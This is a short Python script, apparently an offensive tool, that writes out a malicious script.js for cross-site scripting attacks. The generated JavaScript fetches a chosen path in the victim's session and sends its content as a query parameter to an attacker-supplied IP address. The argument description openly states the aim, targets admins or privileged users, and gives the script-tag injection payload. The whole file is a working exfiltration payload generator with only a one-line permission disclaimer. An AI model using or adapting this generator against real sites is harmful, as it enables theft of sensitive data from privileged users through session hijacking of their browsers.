import argparse

# Define the JavaScript template
javascript_template = """
// Define the path to the file
const path = "{directory}";

// Set up a XMLHttpRequest object
const xhttp = new XMLHttpRequest();

// Set up the function to run when the request completes
xhttp.onreadystatechange = function () {{
    if (this.readyState == 4 && this.status == 200) {{
        // Get the file content and encode as URI component
        const content = encodeURIComponent(this.responseText);

        // Append the content to the URL as a query parameter
        const sendTo = "http://{ip}?content=" + content;

        // Send the GET request 
        const sendReq = new XMLHttpRequest();
        sendReq.open("GET", sendTo, true);
        sendReq.send();
    }}
}};

// Make the request to get the file content
xhttp.open("GET", path, true);
xhttp.send();
"""

def generate_script(directory, ip):
    return javascript_template.format(directory=directory, ip=ip)

def main():
    # Set up command-line argument parser
    parser = argparse.ArgumentParser(description="This script will generate a malicious .js file. When this is used in an XSS attack, it will cause the victim to navigate to the target directory and send the content to the attacker. This is useful if the victim is an admin or privileged user with access to sensitive information. Only use with permission. The XSS payload is <script src=http://[attacker-ip]/script.js></script>")
    parser.add_argument("-d", "--directory", required=True, help="Target Directory")
    parser.add_argument("-i", "--ip", required=True, help="Attacker IP Address")

    # Parse command-line arguments
    args = parser.parse_args()

    # Generate JavaScript code
    javascript_code = generate_script(args.directory, args.ip)

    # Write the code to script.js
    with open("script.js", "w") as file:
        file.write(javascript_code)

    print("JavaScript code has been written to script.js")

if __name__ == "__main__":
    main()
